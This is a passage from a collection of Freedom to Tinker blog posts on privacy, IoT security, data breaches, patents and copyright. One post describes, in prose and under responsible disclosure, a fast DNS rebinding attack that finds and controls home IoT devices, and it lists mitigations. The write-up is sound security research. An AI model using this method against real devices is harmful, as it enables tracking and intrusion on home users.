claims to have reversed nearly 3MM email addresses. In another case, Infutor set up a near real-time online service to reverse hashed emails for an EU company, which “is able to extract a hashed email from the website visit”. Infotutor boasts that they could meet their client’s sub-500 millisecond response time requirement to reverse a given hash. The Leads Warehouse – “We have cracked the code”: The Leads Warehouse claims that “[they] recover all of your MD5 hashed emails” quickly, securely and cost-effectively through their bizarrely named service “MD5 Reverse Encryption”. Their website reads “[i]n fact, [hashed emails are] designed to be impenetrable and irreversible. Don’t sweat it, though, we have cracked the code.” The Leads Warehouse also sells phone and mailing leads that include Sleep Apnea, Wheelchair Leads and Student Loans list. For their Ailment & Diabetic Email Lists, they claim they have “amazing filtering options” including length of illness, age, ethnicity, cost of living/hospital expenses. Are hashed email addresses “pseudonymous” data under the GDPR? In response to our earlier blog post on login manager abuse, a European company official claimed that hashed email addresses are “pseudonymous identifier[s]” and are “compliant with regulations.” The upcoming EU General Data Protection Regulation (GDPR) indeed recognizes pseudonymization as a security measure [4] and considers it as a factor in certain obligations [5]. But can email hashing really be classified as pseudonymization under GDPR? The GDPR defines pseudonymization as: “the processing of personal data in such a manner that the personal data can no longer be attributed to a specific data subject without the use of additional information, provided that such additional information is kept separately and is subject to technical and organisational measures to ensure that the personal data are not attributed to an identified or identifiable natural person;” [6] For example, if email addresses were encrypted and the key stored separately with additional protections, the encrypted data could be considered pseudonymized under this definition. If there were a breach of the data, the adversary would not be able to recover the email addresses without the key. However, hashing does not require a key. The additional information needed to reverse hashed email addresses — lists of email addresses, or algorithms that guess plausible email addresses — can be obtained in several ways as we described above. None of these methods requires additional information that “is kept separately and is subject to technical and organisational measures”. Therefore we argue that email hashing does not fall under GDPR’s definition of pseudonymisation. Conclusion Hashed email addresses can be easily reversed and linked to an individual, therefore they do not provide any significant protection for the data subjects. The existence of companies that reverse email hashes shows that calling hashed email addresses “anonymous”, “private”, “irreversible” or “de-identified” is misleading and promotes a false sense of privacy. If reversing email hashes were really impossible as claimed, it would cost more than 4 cents. Even if hashed email addresses were not reversible, they could still be used to match, buy and sell your data between different parties, platforms or devices. As privacy scholars have already argued, when your online profile can be used to target, affect and manipulate you, keeping your true name or email address private may not bear so much significance [7]. Acknowledgements: We thank Brendan Van Alsenoy for his helpful comments. End notes: [1]: Hourly price for Amazon EC2 p3.16xlarge instance is $24.48 (as of March 2018). [2]: HaveIBeenPwned does not share data from breaches, but leaked datasets can be found on underground forums, torrents and file sharing sites. [3]: See also, Demir et al. The Pitfalls of Hashing for Privacy. [4]: Article 32 The GDPR. [5]: Article 6(4)(e), Article 25, Article 89(1) The GDPR. [6]: Article 4(5), The GDPR. [7]: See, for instance, “Big Data’s End Run around Anonymity and Consent” (Barocas and Nissenbaum, 2014) and “Singling Out People Without Knowing Their Names – Behavioural Targeting, Pseudonymous Data, and the New Data Protection Regulation” (Zuiderveen Borgesius, 2016)."
"83","2018-06-21","2023-03-24","https://freedom-to-tinker.com/2018/06/21/fast-web-based-attacks-to-discover-and-control-iot-devices/","By Gunes Acar, Danny Y. Huang, Frank Li, Arvind Narayanan, and Nick Feamster Two web-based attacks against IoT devices made the rounds this week. Researchers Craig Young and Brannon Dorsey showed that a well known attack technique called “DNS rebinding” can be used to control your smart thermostat, detect your home address or extract unique identifiers from your IoT devices. For this type of attack to work, a user needs to visit a web page that contains malicious script and remain on the page while the attack proceeds. The attack simply fails if the user navigates away before the attack completes. According to the demo videos, each of these attacks takes longer than a minute to finish, assuming the attacker already knew the IP address of the targeted IoT device. According to a study by Chartbeat, however, 55% of typical web users spent fewer than 15 seconds actively on a page. Does it mean that most web users are immune to these attacks? In a paper to be presented at ACM SIGCOMM 2018 Workshop on IoT Security and Privacy, we developed a much faster version of this attack that takes only around ten seconds to discover and attack local IoT devices. Furthermore, our version assumes that the attacker has no prior knowledge of the targeted IoT device’s IP address. Check out our demo video below. Background Many Internet-of-Things (IoT) devices are exposed to the Internet. Attackers can scan the Internet, discover vulnerable devices, and exploit vulnerable devices at scale. A notable example to this class of attacks is the 2016 DDoS campaign by the Mirai botnet, which caused massive outages for several popular online platforms. IoT devices that are not exposed to the Internet — such as those that are connected to your home network — are not safe from attacks either. Many IoT devices, including Google Home and Chromecast, have unauthenticated web interfaces that allow companion smartphone apps, device hubs, or home automation software to discover, query, and control them. This design, which favors openness and interoperability over security, leaves the door open to web-based attacks that use the browser to circumvent firewalls and network address translation (NAT). How does our attack work? For this attack to work a victim needs to visit a website that contains a malicious script while using her home network. The malicious JavaScript may be embedded by the website owner or served by a malicious ad. The attack is composed of two stages: discovery and DNS rebinding. Stage 1 – Device Discovery: The malicious script scans local IP addresses in parallel using Web Workers and a cross-origin response status leak that we discovered. At the end of Stage 1, the attacker detects whether the victim has a particular device (e.g. Google Home or Chromecast), along with the IP address of the device. As shown in our demo video, it takes around seven seconds to scan all 256 local IP addresses. Stage 2 – DNS Rebinding: For each identified device, the malicious script attempts to perform DNS rebinding using Jaqen. Once the DNS rebinding is complete, the attacker can send commands to control the IoT device or extract personal information such as unique identifiers and WiFi access point BSSIDs (which can be used to gather the precise geolocation of the user). Table 1. What an attacker can achieve using DNS rebinding. Are these attacks limited to Google devices? Unfortunately, no. We found other devices, including a smart switch, a smart TV and two network cameras, that are vulnerable to one more of the threats outlined in Table 1. We disclosed these vulnerabilities to respective vendors in April 2018. We plan to publicly disclose the details of these vulnerabilities at the end of the standard 90-day vulnerability disclosure period. What are the potential risks? Identifying vulnerable software: IoT firmware model and version information can be used to detect IoT devices with known vulnerabilities. Users with outdated or vulnerable devices can be further targeted to compromise devices, spread malware, or conduct DDoS attacks. Location tracking: Nearby wireless network identifiers (BSSIDs) can be used to infer the precise location of a user via publicly available geolocation APIs such as Google Geolocation API. This is the technique we use in the demo video. See Young’s blog post for the details of this attack. User tracking: Unique device identifiers such as MAC addresses and device serial numbers can be used to track users across websites and devices even if they clear browsing data or use private/incognito mode. Deanonymization: An attacker can obtain the username of the victim for one of the network cameras in our study. If the username resembles the real name of the victim, the attacker can potentially identify the device owner. Intrusion: On Chromecast and a smart TV in our study, an attacker can play arbitrary videos. How is our attack different? Compared to two recently published attacks, our attack is much faster (taking around ten seconds [1]), and does not assume the knowledge of the device IP addresses. We take advantage of Web Workers and a cross-origin resource status leakage we discovered during our research to speed up the device discovery. In comparison, Young’s attack takes approximately a minute to complete and it assumes the knowledge of the device IP addresses — an assumption we do not make. Dorsey’s attack sequentially performs DNS rebinding on all possible local IP addresses and all possible devices, which results in an even slower attack. In addition, compared to prior work on web–based LAN scanning, the device discovery part of our attack does not require images (or stylesheets) to be present on the web interfaces, and it circumvents mixed content protections, making it usable on HTTPS websites. This, along with the speed of the attack, makes it a much more feasible attack compared to alternatives. Who can mitigate this problem and how? Here are a few examples of how each stakeholder in the IoT ecosystem can mitigate the problem [2]: IoT manufacturers can validate the Host headers of incoming HTTP requests. DNS providers or ISPs use dnswall or similar software to filter out private IP addresses from DNS replies. Home users can use ad-blockers or tracking protection extensions to block malicious ads. Also certain OpenWRT-based routers can filter private IP addresses in DNS replies. Browser vendors: Past attempts to mitigate DNS rebinding in the browser broke some web services and led to new security vulnerabilities. We believe that a browser-based defense remains as an open research problem. Responsible Disclosure We reported vulnerabilities discovered throughout our research to respective browser (Mozilla and Chromium) and IoT vendors (Google and three other vendors) in April 2018. The Chromium project awarded a bug bounty for our disclosure. Google Home and Chromecast team told us that the reported issue “is a duplicate of an existing bug”. We plan to release our paper and the full technical details of the attack after the 90-days disclosure period. Other IoT Projects At Princeton To learn more about other IoT-related projects at Princeton, check out https://iot-inspector.princeton.edu/. Endnotes [1] Exact duration of the attack depends on factors including the particular IP the device is on, and how fast the device responds to our queries. [2] For a more elaborate study of DNS rebinding defenses, see, https://crypto.stanford.edu/dns/."
"84","2017-03-08","2023-03-24","https://freedom-to-tinker.com/2017/03/08/pragmatic-advice-for-buying-internet-of-things-devices/","We’re hearing an increasing amount about security flaws in “Internet of Things” devices, such as a “messaging” teddy bear with poor security or perhaps Samsung televisions being hackable to become snooping devices. How are you supposed to make purchasing decisions for all of these devices when you have no idea how they work or if they’re flawed? Threat modeling and understanding the vendor’s stance. If a device comes from a large company with a reputation for caring about security (e.g., Apple, Google, and yes, even Microsoft), then that’s a positive factor. If the device comes from a fresh startup, or from a no-name Chinese manufacturer, that’s a negative factor. One particular thing that you might look for is evidence that the device in question automatically updates itself without requiring any intervention on your behalf. You might also consider the vendor’s commitment to security features as part of the device’s design. And, you should consider how badly things could go wrong if that device was compromised. Let’s go through some examples. Your home’s border router. When we’re talking about your home’s firewall / NAT / router box, a compromise is quite significant, as it would allow an attacker to be a full-blown man-in-the-middle on all your traffic. Of course, with the increasing use of SSL-secured web sites, this is less devastating than you’d think. And when our ISPs might be given carte blanche to measure and sell any information about you, you already need to actively mistrust your Internet connection. Still, if you’ve got insecure devices on your home network, your border router matters a lot. A few years ago, I bought a pricey Apple Airport Extreme, which Apple kept updated automatically. It has been easy to configure and manage and it faithfully served my home network. But then Apple supposedly decided to abandon the product. This was enough for me to start looking around for alternatives, wherein I settled on the new Google WiFi system, not only because it does a clever mesh network thing for whole-home coverage, but because Google explicitly claims security features (automatic updates, trusted boot, etc.) as part of its design. If you decide you don’t trust Google, then you should evaluate other vendors’ security claims carefully rather than just buying the cheapest device at the local electronics store. Your front door / the outside of your house. Several vendors offer high-tech door locks that speak Bluetooth or otherwise can open themselves without requiring a mechanical key. Other vendors offer “video doorbells”. And a number of IoT vendors have replacements for traditional home security systems, using your Internet connection for connecting to a “monitoring” service (and, in some cases, using a cellular radio connection as a backup). For my own house, I decided that a Ring video doorbell was a valuable idea, based on its various advertised features, but also if it’s compromised, nobody can see into my house. In the worst case, an attacker can learn the times that I arrive and leave from my house, which aren’t exactly a nation-state secret. Conversely, I stuck with our traditional mechanical door locks. Sure, they’re surprisingly easy to pick, but I might at least end up with a nice video of the thief. I’m assuming that I have more to risk from “smash and grab” amateur thieves than from careful professionals. Ultimately, we do have insurance for these sorts of things. Speaking of which, Ring provides a free replacement if somebody steals your video doorbell. That’s as much a threat as anything. Your home interior. Unlike the outside, I decided against any sort of always-on audio or video devices inside my house. No NestCam. No “smart” televisions. No Alexa or Google Home. After all the hubbub about baby monitors being actively cataloged and compromised, I wouldn’t be willing to have any such devices on my network because the risks outweigh the benefits. On the flip side, I’ve got no problem with my Nest thermostats. They’re incredibly convenient, and the vendor seems to have kept up with software patches and feature upgrades, continuing to support my first-generation devices. If compromised, an attacker might be able to overheat my house or perhaps damage my air conditioner by power-cycling it too rapidly. Possible? Yes. Likely? I doubt it. As with the video doorbell, there’s also a risk that an attacker could profile when I leave in the morning and get home in the evening. Your mobile phones. The only in-home always-on audio surveillance is the “Ok Google” functionality in our various Android devices, which leads to a broader consideration of mobile phone security. All of our phones are Google Nexus or Pixel devices, so are running the latest release builds from Google. I’d feel similarly comfortable with the latest Apple devices. Suffice to say that mobile phone security is really an entirely separate topic from IoT security, but many of the same considerations apply: is the vendor supplying regular security patches, etc. Your home theater. As mentioned above, I’m not interested in “smart” devices that can turn into surveillance devices. Our “smart TV” solution is a TiVo device: actively maintained by TiVo, and with no microphone or camera. If compromised, an attacker could learn what we’re watching, but again, there are no deep secrets that need to be protected. (Gratuitous plug: SyFy’s “The Expanse” is fantastic.) Our TV itself is not connected to anything other than the TiVo and a Chromecast device (which, again, has a remarkably limited attack surface; it’s basically just a web browser without the buttons around the edges). I’m pondering a number of 4K televisions to replace our older TV, and they all come with “smarts” built-in. For most TV vendors, I’d just treat them as “dumb” displays, but I might make an exception for an Android TV device. I’ll note that Google abandoned support for its earlier Google TV systems, including a Sony-branded Google TV Bluray player that I bought back in the day, so I currently use it as a dumb Bluray player rather than as a smart device for running apps and such. My TiVo and Chromecast provide the “smart” features we need and both are actively supported. Suffice to say that when you buy a big television, you should expect it to last a decade or more, so it’s good to have the “smart” parts in smaller/cheaper devices that you can replace or upgrade on a more frequent basis. Other gadgets. In our home, we’ve got a variety of other “smart” devices on the network, including a Rachio sprinkler controller, a Samsung printer, an Obihai VoIP gateway, and a controller for our solar panel array (powerline networking to gather energy production data from each panel!). The Obihai and the Samsung don’t do automatic updates and are probably security disaster areas. The Obihai apparently only encrypts control traffic with internet VoIP providers, while the data traffic is unencrypted. So do I need to worry about them? Certainly, if an attacker could somehow break in from one device and move laterally to another, the printer and the VoIP devices are the tastiest targets, as an attacker could see what I print (hint: nothing very exciting, unless you really love grocery shopping lists) or listen in on my phone calls (hint: if it’s important, I’d use Signal or I’d have an in-person conversation without electronics in earshot). Some usability thoughts. After installing all these IoT devices, one of the common themes that I’ve observed is that they all have radically different setup procedures. A Nest thermostat, for example, has you spin the dial to enter your WiFi password, but other devices don’t have dials. What should they do? Nest Protect smoke detectors, for example, have a QR code printed on them which drives your phone to connect to a local WiFi access point inside the smoke detector. This is used to communicate the password for your real WiFi network, after which the local WiFi is never again used. For contrast, the Rachio sprinkler system uses a light sensor on the device that reads color patterns from your smartphone screen, which again send it the configuration information to connect to your real WiFi network. These setup processes, and others like them, are making a tradeoff across security, usability, and cost. I don’t have any magic thoughts on how best to support the “IoT pairing problem”, but it’s clearly one of the places where IoT security matters. Security for “Internet of Things” devices is a topic of growing importance, at home and in the office. These devices offer all kinds of great features, whether it’s a sprinkler controller paying attention to the weather forecast or a smoke alarm that alerts you on your phone. Because they deliver useful features, they’re going to grow in popularity. Unfortunately, it’s not to possible for most consumers to make meaningful security judgments about these devices, and even web sites that specialize in gadget reviews don’t have security analysts on staff. Consequently, consumers are forced to make tradeoffs (e.g., no video cameras inside the house) or to use device brands as a proxy for measuring the quality and security of these devices."
"85","2013-01-03","2023-03-24","https://freedom-to-tinker.com/2013/01/03/report-on-the-nsf-secure-and-trustworthy-cyberspace-pi-meeting/","The National Science Foundation (NSF) Secure and Trustworthy Cyberspace (SaTC) Principal Investigator Meeting (whew!) took place Nov. 27-29, 2012, at the Gaylord Hotel just outside Washington, DC. The SaTC program is NSF’s flagship for cybersecurity research, although it certainly isn’t the only NSF funding in this area. The purpose of this blog posting is to tell a bit about the event. While I’m one of the NSF program officers for SaTC, the following reflects my opinions, and does not necessarily speak for NSF. The program for the event was organized by Carl Landwehr and Lance Hoffman from George Washington University (with help from other people mentioned below), and logistics were handled by the Annapolis, MD, office of Vanderbilt University. I was the cat herder, but all the credit goes to the GWU, Vanderbilt, and other organizers. The agenda and slides for the event can be found at http://cps-vo.org/group/satc/program. In addition to the knowledge gained and colleagues met, attendees also went home with copies of Control Alt Hack, a new game designed to teach cybersecurity concepts. The purpose of the PI meeting was to build the community of PIs, encouraging them to interact and find new areas for research and collaboration, as well as to identify new areas for future NSF investment. It was explicitly not designed for each PI (or even a substantial fraction) to give a technical talk; with over 750 current grants in place (and more than 800 current PIs and co-PIs), that would have been impossible. Towards that end, there were several events designed for specific purposes, which I’ll describe below. (I hope speakers whom I don’t mention won’t be too offended!) The event opened with welcoming remarks from Dr. Subra Suresh (director of NSF) and Dr. Farnam Jahanian (assistant director of NSF for Computer and Information Science and Engineering), who spoke about the NSF mission and the importance of SaTC. Dr. Eric Grosse (VP of security engineering at Google) spoke about what keeps him up at night, and where he would like to see more research. He noted that Google’s goal is to get security for home users to the same (imperfect) level as corporate users. He also sees protecting individuals from government snooping as a key requirement. His key worries are malware (mostly on client machines), authentication (users lose their credentials and use common passwords), network security (including certificate authority issues), product vulnerabilities (which are getting better but still have a long way to go), and economic crimes. He noted hardware and software supply chain risks and issues with systems being constantly updated, noting that fuzz testing is (unfortunately) still a very effective way to find problems. [NSF funds research in all of these areas, and is co-sponsoring an upcoming workshop on hardware supply chain issues.] Five years ago, XSS was the most common vulnerability, and today it still is. A browser rollback feature – i.e., after you visit a bad site and realize it, you can click a button to undo the damage – is still a wish. (Of course, undo isn’t possible if information is stolen, since it can’t be “un-stolen.”) In response to a question, he said that collaboration with Google is possible on smaller products, but not likely with Chrome or Gmail, at least to start. To encourage interdisciplinary thinking, next was a panel (“Crossing the Line: Recent Research Results that Cross Disciplines”) with four of the coolest recent research projects I’ve seen: Mike Byrne (Rice University) talked about surprising results from human factors testing of voting machines, which grew from a partnership between psychology and computer science; Fabian Monrose(University of North Carolina Chapel Hill) explained how to understand encrypted speech by analyzing packet sizes, which was a partnership with the linguistics department at his school; Vern Paxson (ICSI) described their analysis of the economics of spam networks, and how they were able to reduce spam by choking off the financial blood supply, which led them to collaboration with a host of US and international government agencies; and Dan Boneh (Stanford University) explained how using concepts similar to those in learning music, users can learn a password that they’re not aware of knowing (a psychology/computer science collaboration). While many of the attendees had seen one or more of these talks before, the condensed 15-minute versions gave a hint of this research – and I encourage anyone to look at the slides and read the corresponding papers for more details. Later that morning, Angela Sasse (University College London) spoke about the value of multidisciplinary work, as well as barriers to that work. As an example, much of the work in usable security has shown that efforts to replace passwords are too slow and unreliable. Instead, we need to be making the system accommodate people, instead of having people accommodate the system. Security isn’t anybody’s goal; it’s what we have to do to accomplish our tasks. Security designers don’t spend enough effort looking at the human implications of their designs – CAPTCHAs are an anti-usability feature, and they have a negative impact on organizations that use them. Only by looking at security from a multi-disciplinary perspective will we come up with solutions that are both secure and usable. The next section of the event was a discussion of the Federal Cybersecurity R&D Strategic Plan, in three parts (What is it; What Gets Funded; and What’s the Future – An Open Discussion). This was the only recorded portion of the PI meeting, so I’ll just point you to it, and thank the speakers – Bill Newhouse (NIST), Tomas Vagoun (NITRD), Doug Maughan (DHS), Keith Marzullo (NSF), Brad Martin (ODNI), and Steve King (OSD). If you know the acronyms, you must be a Washingtonian! What I found surprising about this panel is that the audience (both in the room and online) asked relatively few questions about the strategy itself, and made few suggestions for changes. I hope that the call for comments published in the Federal Register allowed enough time for thoughtful suggestions. Towards the mission of encouraging interdisciplinary work was Cross Disciplinary Conversations –one-on-one discussions between researchers from different disciplines, set up by matching skills and interests selected on a registration form. Attendees reported that this was a highly valuable part of the meeting. The software for interest matching was developed by Apu Kapadia and Zahid Rahman from Indiana University, and Elaine Shi from the University of Maryland also helped organize this event. They undoubtedly have an interdisciplinary future – one of the matches was between a husband and wife! Finally, we wrapped up a long day with poster sessions organized by Micah Sherr (Georgetown University) – most of the posters are available here. Birds of a Feather sessions ran in parallel, including a discussion of trust (involving social scientists and computer scientists, and how their views differ), cyber physical systems security, issues with interdisciplinary research, and community diversity (increasing numbers of women and underrepresented minorities in the cybersecurity research community). The second day started with welcomes from NSF leadership (Myron Gutmann, assistant director of NSF for Social, Behavioral & Economic Sciences and Alan Blatecky, director for the NSF Office of Cyberinfrastructure). The first panel approached Transition to Practice from perspectives of academics transitioning their technology (Paul Barford (University of Wisconsin) and Vern Paxson (ICSI)), government program managers encouraging transition (Doug Maughan (DHS)), venture capitalists investing in technology (Becky Bace (University of South Alabama)), and the needs of the commercial industry (Ron Perez (CSRA)). Transition is complicated, and requires skill sets well beyond just technical expertise. There are many different transition paths, including not only the obvious commercialization, but also open sourcing, licensing, use by operational government agencies, etc. Government programs like SBIR and STTR can help, as can NSF-specific programs like iCorps, and the Transition to Practice perspective and option within the SaTC program. Some of the chatter in the hall after this panel was about the balance between NSF’s primary mission of basic research and its efforts to encourage transitional work. It’s noteworthy that >90% of SaTC funding goes into basic research and less than 10% into transition. The “Teaching and Learning: Competitions and Cybersecurity” panel included three viewpoints on how to get students involved in cybersecurity through competitions. Nick Weaver (ICSI) talked about the tradeoffs between built-it competitions and skills competitions (a.k.a. “break it”). Built-it requires more effort by participants, and doesn’t have the “cool” factor of winning that break-it competitions have. Ben Cook (Sandia) described a hybrid competition where teams built a simplified voting system, and then attacked each others’ systems. [Ob disclosure: I helped with the design of their project.] Ron Dodge (US Military Academy) talked about some of the pros & cons of different approaches to competitions. One factor that I believe should get more attention is that break-it competitions bring out the worst in macho behavior, and by doing so chase away many women – thus denying our field many of the brightest contributors. I hope that hybrid efforts like Sandia’s will help reduce that negative. John Mitchell (Stanford University) spoke about security and privacy issues with Massively Open Online Courses. Unfortunately I missed most of his talk. The afternoon was given to 19 (!) parallel breakout sessions, covering a wide variety of topics. Attendees were assigned to groups based on interests expressed when they registered, and each group of 10-20 people was given a set of questions to address. The day wrapped up with more posters and Birds of a Feather sessions. The third day began with reports out from the working groups. Daniel Weitzner (MIT) and Michael Reiter (University of North Carolina Chapel Hill) organized brief presentations from the previous day’s groups – see the slides for a summary of their recommendations. I hope to have a report to share before long with more detail. The goal of this exercise was (in part) to identify areas for future NSF solicitations, so it’s worth looking at the outcomes to get ideas. The PI meeting concluded with Stuart Firestein (Columbia University) speaking about the topic of his recent book “Ignorance: How it Drives Science”. I wish I could summarize his talk, but it’s hard. I encourage you to look at his slides, read his book, and – if you ever have a chance – see him! While the talk has nothing to do with security, it has everything to do with how we think about science, and it’s entertaining too! The post-event survey (and informal comments made to me in the halls) showed that the Cross Disciplinary Conversations was the most popular event, and that most attendees found the agenda useful and would return whether or not it was required by the terms of their grants. The next SaTC PI meeting will be in 2014 (date and time not yet determined). The best way to get an invitation is to become a SaTC PI, so think up great ideas, write proposals, and come join us!"
"86","2022-11-23","2023-03-24","https://freedom-to-tinker.com/2022/11/23/citp-seeks-postdocs-for-fellows-program/","Those with a background in information integrity, or in precision health are especially encouraged to apply. As part of our Fellows program, CITP is hiring a Postdoctoral Research Associate. This position is designed for people who have recently received or are about to receive a Ph.D. Applicants should have experience conducting research in at least one of our three focus areas: Data Science and the intersection of Artificial Intelligence and Society; Privacy and Security Digital Platforms and Infrastructure We are especially interested in hearing from postdoc candidates who specialize in “information integrity,” as part of our privacy and security focus. We are also seeking postdocs who work at the intersection of precision health, data-driven medicine and public policy, as part of our “Data Science and AI and Society” focus area."
"87","2022-02-10","2023-03-24","https://freedom-to-tinker.com/2022/02/10/tmobile-deleting-stale-data-reduces-liability/","T-Mobile’s data breach in August 2021 exposed the social security numbers and drivers license numbers for over 40 million former or prospective customers. I recently discovered that I was one such victim because of an alert that popped up on my phone this weekend from my credit monitoring service. I was surprised because I have not been a customer for over 5 years. Why did they still have my data? T-Mobile has not yet contacted me or explained why they retained my data. Various state and federal regulators are now investigating whether T-Mobile had “reasonable data security” measures in place to protect customer information. Certain aspects of the regulatory investigation will undoubtedly examine what technical measures T-Mobile used and whether they were adequate. But one important non-technical issue worth investigating further is whether the company had meaningful data retention and deletion policies, and whether it followed them. It appears T-Mobile’s privacy policy first introduced a statement about its data retention practices in 2013, as captured in a longitudinal study, “Privacy Policies over Time: Curation and Analysis of a Million-Document Dataset,” that our team of researchers at the Center for Information Technology Policy published in 2021. The retention policy itself is a terse one-line statement that says “we retain your personal data for business or tax needs, or legal reasons,” without any further explanation. But what “business need” required retaining sensitive information about former or prospective customers who had not converted into T-Mobile customers? If T-Mobile cannot justify a legitimate need, it should be held accountable for misleading the public about its data practices. Recent data breaches involving telecommunication carriers – this is the 5th reported breach for T-Mobile since 2018 – have led the Federal Communications Commission to consider new rules to address data breaches. The FCC might draw inspiration from the Federal Trade Commission’s security guidelines for information held by financial institutions. The FTC used our public comments to modify the Safeguards Rule to require automatic destruction of customer information two years after it was last used, unless the information is required for a legitimate business purpose. In a different context, the FTC’s rules implementing the Children’s Online Privacy Protection Act of 1998 also mandates data retention and deletion requirements when it comes to information about children: “An operator of a Web site or online service shall retain personal information collected online from a child for only as long as is reasonably necessary to fulfill the purpose for which the information was collected. The operator must delete such information using reasonable measures to protect against unauthorized access to, or use of, the information in connection with its deletion.” In short, minimizing data collection and retention are simple, inexpensive steps that are effective against all manner of sophisticated or unsophisticated attacks. Any company that seeks to protect their customers should develop such policies to reduce its liability in the event of a data breach."
"88","2013-06-14","2023-03-24","https://freedom-to-tinker.com/2013/06/14/on-the-legal-importance-of-viewing-genes-as-code/","The Supreme Court yesterday issued its opinion in the much–awaited Myriad case, which challenged the validity of patents on isolated human genes. The Court held that the isolated genetic sequences claimed in Myriad’s patents did not satisfy the inventive threshold for patentability, although the complementary DNA (cDNA) claimed in the patents did. One of the more interesting elements of the case for me is the extent to which the outcome turned on a single conceptual choice: When assessing patentability, should the legal analysis focus on the isolated DNA’s chemical structure or its information-coding function? The Court decided that the information-coding function was the proper focus. That choice led the justices to the inevitable conclusion that the isolated sequences were not patentable. The Court of Appeals for the Federal Circuit, by contrast, had focused on the sequences’ chemical structure and had reached the opposite conclusion. Why did this conceptual choice turn out to be so consequential? To be patentable, an invention must be the product of human ingenuity. Products of nature and natural phenomena are excluded from the scope of patent protection. The leading case in the domain of patents on living organisms is Diamond v. Chakrabarty, in which the Court said that patent protection could extend to “anything under the sun that is made by man.” The scope is very broad (i.e., “anything under the sun), but it isn’t unlimited (i.e., it has to be “made by man”). The question courts must ask to separate products of nature from products of human ingenuity is whether the claimed invention is “markedly different” from something that is found in nature. To reach the conclusion that the isolated genes at issue in the case were markedly different from naturally occurring ones, Judge Lourie of the Federal Circuit, who wrote the lower court’s majority opinion, emphasized the transformation that occurred in the chemical structure of the isolated gene during the process of isolation. Isolated DNA has been cleaved (i.e., had covalent bonds in its backbone chemically severed) or synthesized to consist of just a fraction of a naturally occurring DNA molecule…. Accordingly, BRCA1 and BRCA2 in their isolated state are not the same molecules as DNA as it exists in the body; human intervention in cleaving or synthesizing a portion of a native chromosomal DNA imparts on that isolated DNA a distinctive chemical identity from that possessed by native DNA. For Judge Lourie, severing covalent bonds—the chemical equivalent of snipping the desired piece of DNA on either end with a scissors—was a sufficient human intervention to make the isolated sequences patentable. Judge Bryson, who dissented in the Federal Circuit, disagreed. Judge Bryson believed that the patentability question hinged on whether the process of isolation functioned in any way to change the informational content of the genes. The isolated BRCA genes are identical to the BRCA genes found on chromosomes 13 and 17. They have the same sequence, they code for the same proteins, and they represent the same units of heredity.…The only difference between the naturally occurring BRCA genes during transcription and the claimed isolated DNA is that the claimed genes have been isolated according to nature’s predefined boundaries, i.e., at points that preserve the ability of the gene to express the protein for which it is coded. Viewed as coded information and not as a chemical molecule, the isolated genes are no different from their naturally occurring counterparts, which means that the element of human ingenuity required for patentability is lacking. The Supreme Court agreed with Judge Bryson’s approach, concluding that Myriad’s patent claims were directed to the informational content of the isolated genes and not their chemical structure. Nor are Myriad’s claims saved by the fact that isolating DNA from the human genome severs chemical bonds and thereby creates a nonnaturally occurring molecule. Myriad’s claims are simply not expressed in terms of chemical composition….Instead, the claims understandably focus on the genetic information encoded in the BRCA1 and BRCA2 genes…[Myriad’s] claim is concerned primarily with the information contained in the genetic sequence, not with the specific chemical composition of a particular molecule. The Court was presented in the case with two scientifically sound and plausible ways of thinking about isolated genes. From a scientific perspective, the two views are not mutually incompatible, but from a legal perspective, the chemical composition view supports the assertion of exclusive property rights and the coded information view doesn’t. In what I think is the right result, the coded information view won the day."
"89","2013-04-22","2023-03-24","https://freedom-to-tinker.com/2013/04/22/copyrights-fundamental-rights-and-the-constitution/","There was a lot to take issue with in Scott Turow’s recent op-ed in The New York Times. Turow, who is currently President of the Authors Guild, took to The Times to criticize the Supreme Court’s decision in Kirtsaeng v. John Wiley & Sons, which brought physical books manufactured and sold abroad within the protective scope of copyright’s first sale doctrine. Turow cast the Court’s decision as another blow to authors’ rights, which, by his account, are being pitilessly washed away by the digital tides. He blames the usual suspects: e-books, Amazon.com, pirates, Google, and—this last one may surprise you—libraries. The coup de grace, he asserted, will be the extension of first sale rights to digital copies of books. (It may comfort him to know that the possibility of that happening is more remote following Redigi’s recent defeat in federal district court.) What bothered me most about Turow’s argument, however, wasn’t its scapegoating of digital technology. That’s an entirely predictable element of the genre to which the piece belongs. What was troubling but new was Turow’s very wrong assertion that copyright is a fundamental Constitutional right. Here’s how he put it: Authors practice one of the few professions directly protected in the Constitution, which instructs Congress “to promote the progress of Science and the useful Arts by securing for limited Times to Authors and Inventors the exclusive Right to their respective Writings and Discoveries.” To be clear, the Constitution does not “instruct” Congress to do anything at all with respect to the protection of intellectual property, and authors are therefore not “directly protected by the Constitution” any more than any other citizens are directly protected by the Constitution. Here’s what Article 1, Clause 8 of the Constitution says: The Congress shall have power to promote the progress of Science and the useful Arts by securing for limited Times to Authors and Inventors the exclusive Right to their respective Writings and Discoveries. Giving Congress power to do something and instructing Congress to do something are very different things. The critical difference in the law between “may” and “shall” is Law School 101. Exclusive rights in intellectual property are not natural rights, and they’re not fundamental Constitutional rights. They are emphatically not on the order of Due Process, Equal Protection, and the First Amendment. Copyrights are property only if and to the extent that Congress chooses to say they are. Over time, Congress has chosen to make copyrights extremely strong—much stronger, I think, than is necessary to promote the progress of Science, and arguably so strong that we are courting the opposite result. Intellectual property rights in general and copyrights in particular are important, and when their scope is circumscribed to ensure the existence of a robust public domain, they benefit society. However important IP rights are, though–and reasonable people disagree pretty vigorously about that–they are not fundamental in the Constitutional sense. No reasonable person would argue that they are."
"90","2016-07-19","2023-03-24","https://freedom-to-tinker.com/2016/07/19/pokemon-go-and-the-law-privacy-intellectual-property-and-other-legal-concerns/","Pokémon Go made 22-year-old Kyrie Tompkins fall and twist her ankle. “[The game] vibrated to let me know there was something nearby and I looked up and just fell in a hole,” she told local news outlet WHEC 10. So far, no one has sued Niantic or The Pokémon Company for injuries suffered while playing Pokémon Go. But it’s only a matter of time before the first big Pokémon Go related injury, whether that comes in the form of a pedestrian drowning while catching a Magikarp (the most embarrassing possible injury) or a car accident caused by a distracted driver playing the game. Before the first lawsuits arrive, here’s a brief analysis of some of the legal issues involved with the new hit mobile game. LIABILITY FOR INJURIES A few minor injuries have already happened to Pokémon Go players. If a serious accident does occur, injured players can look to legal precedent from Snapchat-related car crashes. The Snapchat claimants sued on a theory of product liability, essentially stating that Snapchat created a product that had inherent risks of foreseeable harm to consumers and/or released a product without sufficient warnings against potential harms. Similarly, Pokémon Go players could argue that it’s predictable that players would stare at their phones while walking distractedly, ignoring natural hazards and oncoming cars. However, many of the Snapchat lawsuits center on Snapchat’s speed filter encouraging drivers to Snap while driving. No such filter exists for Pokémon Go. 